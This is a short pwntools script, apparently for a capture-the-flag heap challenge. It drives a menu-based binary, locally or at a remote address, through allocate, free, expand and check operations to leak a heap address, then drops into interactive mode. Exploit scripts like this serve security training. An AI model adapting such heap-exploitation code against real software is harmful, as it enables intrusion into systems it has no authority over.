#!/usr/bin/python3

from pwn import *

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b* 0x0000000000401675
                b* create
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('103.130.219.236', 5002)
else:
        p = process(exe.path)

GDB()
def taokho(pos, des):
    sla(b"> ", b"1")
    sla(b"> ", str(pos).encode())
    sla(b"> ", des)
def xoakho(pos):
    sla(b"> ", b"2")
    sla(b"> ", str(pos).encode())
def morong(pos, size, des):
    sla(b"> ", b"3")
    sla(b"> ", str(pos).encode())
    sla(b"> ", str(size).encode())
    s(des)
def kiemtra(pos):
    sla(b"> ", b"4")
    sla(b"> ", str(pos).encode())

taokho(0, b'0' * 6)
morong(0, 0x10, b"a" * 0x10)
xoakho(0)
taokho(1, b'1'*6)
morong(1, 0x10, b"a" * 0x10)
kiemtra(1)
heap = u64(p.recv(8))
info("heap: " + hex(heap))
p.interactive()


